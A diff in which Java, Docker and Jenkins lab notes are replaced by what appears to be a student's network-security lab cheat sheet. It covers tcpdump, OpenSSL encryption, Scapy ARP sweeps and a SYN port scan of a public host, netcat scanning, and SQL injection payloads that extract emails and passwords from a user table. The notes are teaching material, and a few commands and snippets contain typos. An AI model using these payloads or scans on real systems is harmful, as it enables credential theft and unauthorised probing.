@@ -1,370 +1,274 @@
-public class BankService { 
+## TCPDUMP
+sudo tcpdump -D
+sudo tcpdump -i enp0s3
+sudo tcpdump -i enp0s3 host <ip or dns>
+sudo tcpdump -i enp0s3 port 80 
+sudo tcpdump -i enp0s3 port 443
+sudo tcpdump -i enp0s3 -w file.pcap
+sudo tcpdump -i enp0s3 -a -r file.pcap
+sudo tcpdump -i enp0s3 -xx -r file.pcap
+
+sudo tcpdump -i enp0s3 icmp
+sudo tcpdump -i enp0s3 tcp
+sudo tcpdump -i enp0s3 'tcp[tcpflags] & tcp-syn != 0' -w file1.pcap
+sudo tcpdump -a -r file.pcap
+sudo tcpdump -i enp0s3 'tcp[tcpflags] & tcp-ack != 0' -w file1.pcap
+sudo tcpdump -a -r file.pcap
+sudo tcpdump -i enp0s3 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-syn != 0' -w file1.pcap
+sudo tcpdump -a -r file.pcap
+
+Use 2 terminal 1 for ping and other to capture packets
+(IMP note:To capture http and http use curl http://example.com and https://example.com respectively.Also for tcp 3 way handshake use curl google.com or curl http://example.com )
+( For icmp and others use ping google.com)
+
+for pure flags use 
+
+sudo tcpdump -i enp0s3 'tcp[tcpflags] == tcp-ack' -w file1.pcap
+-----------------------------------------------------------
+
+## Text encryption and decryption using cbc and ecb
+
+touch plain.txt 
+nano plain.txt
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -K 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f 
+openssl enc -aes-128-cbc -d -in cipher1.bin -out output1.txt -K 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f 
+xxd cipher1.bin 
+cat output1.txt 
+
+openssl enc -aes-128-ecb -e -in plain.txt -out cipher2.bin -K 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-ecb -d -in cipher2.bin -out output2.txt -K 00112233445566778899aabbccddeeff 
+xxd cipher2.bin 
+cat output2.txt
+
+-----------------------------------------------------------
+
+## Image(Bitmap or bmp) encryption using ecb and cbc
+
+openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -K 0123456789abcdeffedcba9876543210 
+openssl enc -aes-128-cbc -e -in pic_original.bmp -out pic_cbc.bmp -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+
+head -c 54 pic_original.bmp > header 
+
+tail -c +55 pic_ecb.bmp > body_ecb 
+cat header body_ecb > new_ecb.bmp 
+tail -c +55 pic_cbc.bmp > body_cbc 
+cat header body_cbc > new_cbc.bmp 
+eog new_ecb.bmp 
+eog new_cbc.bmp 
+
+---------------------------------------------------------------
+
+## Padding experiment 
+
+echo -n 12345 > f1.txt 
+echo -n 1234567890 > f2.txt 
+echo -n 1234567890abcdef > f3.txt 
+
+ls -l f*.txt 
+
+openssl enc -aes-128-cbc -e -in f1.txt -out f1.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f1.bin -out f1_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f1.bin -out f1_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+
+openssl enc -aes-128-cbc -e -in f2.txt -out f2.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f2.bin -out f2_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f2.bin -out f2_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+
+openssl enc -aes-128-cbc -e -in f3.txt -out f3.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f3.bin -out f3_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+openssl enc -aes-128-cbc -d -in f3.bin -out f3_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff 
+
+ls -l f*.bin 
+
+xxd f1.txt 
+xxd f1_nopad.txt 
+xxd f2.txt
+xxd f2_nopad.txt
+xxd f3.txt
+xxd f3_nopad.txt
+
+---------------------------------------------------------------
+
+## Error propagation
+
+touch plain.txt 
+nano plain.txt
+ls -l plain.txt
  
-    // Nested class (can be public or private, doesn't matter for functionality) 
-    static class BankAccount { 
-        private double balance; 
+openssl enc -aes-128-ecb -e -in plain.txt -out cipher1.bin -k 00112233445566778899aabbccddeeff 
+ghex cipher1.bin 
+openssl enc -aes-128-ecb -d -in cipher1.bin -out cipher1.txt -k 00112233445566778899aabbccddeeff 
+gedit cipher2.txt
  
-        public BankAccount(double initialBalance) { 
-            if (initialBalance < 0) { 
-                throw new IllegalArgumentException("Initial balance cannot be negative"); 
-            } 
-            this.balance = initialBalance; 
-        } 
- 
-        public void deposit(double amount) { 
-            if (amount <= 0) { 
-                throw new IllegalArgumentException("Deposit must be positive"); 
-            } 
-            balance += amount; 
-        } 
- 
-        public void withdraw(double amount) { 
-            if (amount <= 0 || amount > balance) { 
-                throw new IllegalArgumentException("Invalid withdrawal"); 
-            } 
-            balance -= amount; 
-        } 
- 
-        public double getBalance() { 
-            return balance; 
-        } 
-    } 
- 
-    // The main entry point 
-    public static void main(String[] args) { 
-        // Create an instance of the BankAccount class 
-        BankAccount acc = new BankAccount(5000); 
-         
-        System.out.println("Initial Balance: " + acc.getBalance()); 
- 
-        // Perform operations 
-        acc.deposit(700); 
-        System.out.println("Balance after deposit of 500: " + acc.getBalance()); 
- 
-        acc.withdraw(100); 
-        System.out.println("Balance after withdrawal of 300: " + acc.getBalance()); 
- 
-        // Print final result 
-        System.out.println("Final Balance: " + acc.getBalance()); 
-    } 
-} 
----------------------------------------------------------
-mvn clean
-mvn package
-cd target
-java -cp sample-app-1.0-SNAPSHOT.jar com.bnmit
-----------------------------------------------------------
-Calculator.java 
-public class Calculator {
-
-    public int add(int a, int b) {
-        return a + b;
-    }
-
-    public int subtract(int a, int b) {
-        return a - b;
-    }
-
-    public int multiply(int a, int b) {
-        return a * b;
-    }
-
-    public double divide(int a, int b) {
-        if (b == 0) {
-            throw new ArithmeticException("Cannot divide by zero");
-        }
-        return (double) a / b;
-    }
-
-    public int square(int a) {
-        return a * a;
-    }
-
-    public int max(int a, int b) {
-        return (a > b) ? a : b;
-    }
-}
-
-
----------------------------------------------------------------------------------------------------
-CalulatorTest.java
-import org.junit.jupiter.api.Test;
-import static org.junit.jupiter.api.Assertions.*;
-
-public class CalculatorTest {
-
-    Calculator calc = new Calculator();
-
-    @Test
-    void testAdd() {
-        assertEquals(8, calc.add(5, 3));
-    }
-
-    @Test
-    void testSubtract() {
-        assertEquals(2, calc.subtract(5, 3));
-    }
-
-    @Test
-    void testMultiply() {
-        assertEquals(15, calc.multiply(5, 3));
-    }
-
-    @Test
-    void testDivide() {
-        assertEquals(2.0, calc.divide(6, 3));
-    }
-
-    @Test
-    void testSquare() {
-        assertEquals(25, calc.square(5));
-    }
-
-    @Test
-    void testMax() {
-        assertEquals(9, calc.max(9, 4));
-    }
-
-    @Test
-    void testDivideByZero() {
-        Exception exception = assertThrows(
-            ArithmeticException.class,
-            () -> calc.divide(5, 0)
-        );
-
-        assertEquals("Cannot divide by zero", exception.getMessage());
-    }
-}
-
-
----------------------------------------------
-1)
-cmd -    
-javac -cp "lib/junit-platform-console-standalone-1.10.0.jar" -d bin src/*.java  
-java -jar lib/junit-platform-console-standalone-1.10.0.jar execute --class-path bin --scan-class-path --details tree 
-
-
-------------------------------------------------
-4)
-plugins
-
-<plugins>
-  <plugin>
-    <groupId>org.jacoco</groupId>
-    <artifactId>jacoco-maven-plugin</artifactId>
-    <version>0.8.11</version>
-
-    <executions>
-      <!-- Attach JaCoCo agent -->
-      <execution>
-        <goals>
-          <goal>prepare-agent</goal>
-        </goals>
-      </execution>
-
-      <!-- Generate report -->
-      <execution>
-        <id>report</id>
-        <phase>test</phase>
-        <goals>
-          <goal>report</goal>
-        </goals>
-      </execution>
-    </executions>
-  </plugin>
-</plugins>
---------------------------------------------------------
-5)
-terminal
-docker run hello-world
-docker pull nginx
-docker run -d -p 8082:80 ngnix
-
-
----------------------------------------------------
-6)
-dockerfile
-FROM python:3.9-slim
-WORKDIR /app
-COPY . /app
-CMD ["python", "app.py"]
-from http.server import SimpleHTTPRequestHandler, HTTPServer 
-PORT = 5020 
-
-class MyHandler(SimpleHTTPRequestHandler): 
-    def do_GET(self): 
-        self.send_response(200) 
-        self.send_header("Content-type", "text/html") 
-        self.end_headers() 
-        self.wfile.write(b"<h1>Hello from Docker Python Container</h1>") 
-    
-server = HTTPServer(("0.0.0.0", PORT), MyHandler) 
-print(f"Server running on port {PORT}...") 
-server.serve_forever()
-docker build -t myapp .
-docker run myapp
----------------------------------------------------
-7)
-Docker map and volume 
-
-(VScode)
-
---For porting
-
-docker run -d nginx
-
-docker run -d -p 8084:80 nginx
-
-docker volume create myvolume
-docker volume
-
-docker run -it -v myvolume:/data ubuntu bash
-
-cd /data
-echo "Docker Volume Persistence Test" > test.txt
-exit
-
-docker run -it -v myvolume:/data ubuntu bash
-cat /data/test.txt
-
---combining both
-
-docker run -d -p 8081:80 -v myvolume:/usr/share/nginx/html nginx
-docker run -it -v myvolume:/usr/share/nginx/html ubuntu bash
-echo "<h1>Persistent Web Page</h1>" > /usr/share/nginx/html/index.html
-exit
-
-http://localhost:8081
-----------------------------------------------------------------------------------------
-8)
-dockerfile
-FROM eclipse-temurin:17-jdk
-WORKDIR /app
-COPY . /app
-RUN javac Grade.java
-CMD ["java", "Grade"]
-
-
-Grade code
-
-import java.util.Scanner;
-
-public class Grade{
-
-  // Returns a letter grade based on the average
-  static char gradeFunction(double avg) {
-    if (avg >= 90) return 'A';
-    else if (avg >= 80) return 'B';
-    else if (avg >= 70) return 'C';
-    else if (avg >= 60) return 'D';
-    else return 'F';
-  }
-
-  public static void main(String[] args) {
-    Scanner scanner = new Scanner(System.in);
-
-    System.out.print("How many grades (1 to 5)? ");
-    int count = scanner.nextInt();
-
-    // Validate the input count
-    if (count < 1 || count > 5) {
-      System.out.println("Invalid number. You must enter between 1 and 5 grades.");
-      scanner.close();
-      return; // Exit
-    }
-
-    double sum = 0.0;
-
-    // Read each grade
-    for (int i = 1; i <= count; i++) {
-      System.out.print("Enter grade " + i + ": ");
-      double grade = scanner.nextDouble();
-      sum += grade;
-    }
-
-    double avg = sum / count;
-    System.out.println("Average: " + avg);
-    System.out.println("Letter grade: " + gradeFunction(avg));
-    scanner.close();
-  }
-}
-
-docker build -t myapp
-docker login 
-docker tag myapp user_name/myapp:v1.0
-docker push user_name/myapp:v1.0
-
-----------------------------------------------------------------------------------------------
-
-9) pipeline
-
-pipeline {
-    agent any
-
-    stages {
-        stage('Clone Code') {
-            steps {
-                git branch: 'main', url: 'https://github.com/Vani-Khursapur/docker-jenkins-app.git'
-            }
-        }
-
-        stage('Build Docker Image') {
-            steps {
-                bat 'docker build -t my-app .'
-            }
-        }
-
-        stage('Run Container') {
-            steps {
-                bat 'docker run -d my-app'
-            }
-        }
-    }
-}
-
-------------------------------------------------------------------------------------------------------
-10)
-pipeline {
-    agent any
-
-    environment {
-        IMAGE_NAME = "sample-webapp"
-        CONTAINER_NAME = "sample-webapp-container"
-    }
-
-    stages {
-
-        stage('Clone') {
-            steps {
-                git branch: 'main', url: 'https://github.com/Vani-Khursapur/cicd-webapp.git'
-            }
-        }
-
-        stage('Build WAR') {
-            steps {
-                bat 'mvn clean package'
-            }
-        }
-
-        stage('Build Docker Image') {
-            steps {
-                bat 'docker build -t sample-webapp .'
-            }
-        }
-
-        stage('Stop Old Container') {
-            steps {
-                bat 'docker stop sample-webapp-container || exit 0'
-                bat 'docker rm sample-webapp-container || exit 0'
-            }
-        }
-
-        stage('Run Container') {
-            steps {
-                bat 'docker run -d -p 8087:8087 --name sample-webapp-container sample-webapp'
-            }
-        }
-    }
-}
-
-http://localhost:8087/webapp
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher2.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f 
+ghex cipher2.bin 
+openssl enc -aes-128-cbc -d -in cipher2.bin -out cipher2.txt -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f 
+gedit cipher2.txt
+
+if u get bad magic number or bad decrypt use 
+
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher.bin -K 0011223344556677889900aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f10 -nosalt
+
+----------------------------------------------------------------
+
+## RSA
+
+openssl genrsa -out key.pri 2048 
+cat key.pri 
+
+openssl rsa -in key.pri -noout -text 
+openssl rsa -in key.pri -out key.pub -pubout 
+cat key.pub 
+
+touch Earth.txt 
+gedit Earth.txt 
+openssl rsautl -encrypt -inkey key.pub -pubin -in Earth.txt -out Earth.enc 
+openssl rsautl -decrypt -inkey key.pri -in Earth.enc -out Earth.dec 
+cat Earth.dec 
+
+
+openssl rand -hex 32 > encryption.key 
+openssl rsautl -encrypt -inkey key.pub -pubin -in encryption.key -out encryption.key.enc 
+openssl rsautl -decrypt -inkey key.pri -in encryption.key.enc -out encryption.key.dec 
+cat encryption.key 
+cat encryption.key.dec 
+
+============================================================================================================================
+5b)
+from scapy.all import * 
+packet=IP()/TCP() 
+e_pack=Ether()/packet 
+e_pack.show()
+
+6b)
+from scapy.all import * 
+packets=sniff(count=10) 
+packets.summary() 
+print(packets[0].show()) 
+print(packets[1].show())
+
+7A)
+from scapy.all import * 
+result,unanswered=traceroute(["www.example.com","www.google.com"],maxttl=20) 
+result.show()
+
+
+8A)
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = "172.29.240.0/28"
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=2)[0]
+for element in clients:
+    print(element[1].psrc + " - " + element[1].hwsrc)
+
+11a)
+from scapy.all import * 
+packet=IP(dst="8.8.8.8")/ICMP() 
+send(packet)
+
+
+12a) 
+from scapy.all import *
+target = "www.google.com"
+for port in range(70, 85):
+    packet = IP(dst=target) / TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+    if response:
+        print("Port", port, "is open")
+
+
+14a)
+from scapy.all import *
+def callback(packet):
+    if packet.haslayer(ICMP):s
+        print("ICMP Packet Detected")
+        packet.show()
+
+sniff(filter="icmp", prn=callback, count=10)
+
+
+
+
+15a)
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+for element in clients:
+    print(element[1].psrc + " - " + element[1].hwsrc)
+
+
+16a)
+from scapy.all import * result,unanswered=traceroute(["www.example.com","www.google.com"],maxttl=20) 
+result.show()
+=================================================================================
+
+C)
+xx' IN(itemnum,sdesc,ldesc) UNION SELECT email,passwd,123,123 FROM userdb LIMIT 2 --
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+c)
+x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb -- 
+
+===============================================================================
+5c)
+code-
+
+#!/bin/bash
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+        nc -zv localhost $port
+done
+
+terminal---
+nano port_scan.sh
+chmod +x port_scan.sh 
+./port_scan.sh
+-----------------------------------------
+6c)
+nc -vlp 1234                            nc localhost 1234
+nc -vlp 1234				nc <ip addr> 1234
+---------------------------------------------------------------
+7b)
+nc www.example.com 80			
+HEAD / HTTP/1.1
+Host: example.com
+
+nc www.example.com 80
+GET / HTTP/1.1
+Host: example.com
+-----------------------------------------------------------------
+8b)
+nc -l -p 5000
+browser-- localhost:5000 return to cmd
+HTTP/1.1 200 OK
+Content-Type: text/html;
+(double enter)
+hloooo bnm
+browse for output
+-----------------------------------------------------------------
+11b)
+nc -l -p 5000
+browser-- localhost:5000 return to cmd
+HTTP/1.1 200 OK
+Content-Type: text/html;
+(double enter)
+<!doctype>
+<title>appp</title>
+<h1>apppp</h1>
+<img src="image location">
+(double enter)
+ctrl c referesh browser
+
+====================================================================================================================
